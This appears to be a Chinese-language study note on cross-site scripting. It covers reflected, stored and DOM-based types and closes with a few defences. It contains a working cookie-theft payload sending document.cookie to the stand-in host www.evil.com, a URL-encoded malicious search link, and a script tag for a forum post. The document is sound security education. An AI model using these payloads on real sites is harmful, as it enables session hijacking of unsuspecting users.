# Cross-site Scripting  跨站脚本攻击


## 基本原理
简单来说，就是通过 HTML 注入，插入恶意脚本进行攻击。

## XSS 类型
### 反射型 XSS
### 存储型 XSS
### DOM Based XSS

## XSS Payload
用以完成各种具体功能的恶意脚本，被称为 XSS Payload。XSS Payload 实际上就是 JS 脚本，
或者其他 Flash 等富客户端脚本。

### 用于 Cookie 劫持的 Payload
payload 脚本  `http://www.evil.com/payload.js`
```js
var img = document.createElement('img');
img.src = 'http://www.evil.com/log?' + encodeURIComponent(document.cookie);
document.body.appendChild(img);
```
只要上述代码被运行，则 `http://www.evil.com/log` 就可以获取到客户端的 cookie

#### 如果进行反射型 XSS：
假如网站 `www.foo.com` 的搜索功能有 XSS 漏洞，会把用户输入的内容直接添加到 DOM 中。  
1. 伪装以下链接并诱导用户点击：
`http://www.foo.com/search?word=%3cscript+src%3d%22http%3a%2f%2fwww.evil.com%2fpayload.js%22%3e%3c%2fscript%3e`
2. 用户点击后跳转到搜索页面，并加载 `http://www.evil.com/payload.js`
3. 如果当前用户此时在该网站为登录状态且保存了 cookie，则该 cookie 就会被 `payload.js`
发送到 `http://www.evil.com/log`

#### 如果进行存储型 XSS：
假如网站 `www.foo.com` 的论坛有 XSS 漏洞，会将用户发帖中的 HTML 标签直接添加进 DOM 从
而变得可执行。  
1. 直接把 `payload.js` 中的代码放在 `<script>` 标签里作为帖子内容的一部分发出去
```html
<script>
var img = document.createElement('img');
img.src = 'http://www.evil.com/log?' + encodeURIComponent(document.cookie);
document.body.appendChild(img);
</script>
```
2. 只要有用户进入这个帖子，上述脚本就会获取用户的 cookie 并发送


## 防御手段
[Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)

* `HttpOnly`
* 输入检查

## References
* [白帽子讲Web安全](https://book.douban.com/subject/10546925/)
* <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)">WASP</a>
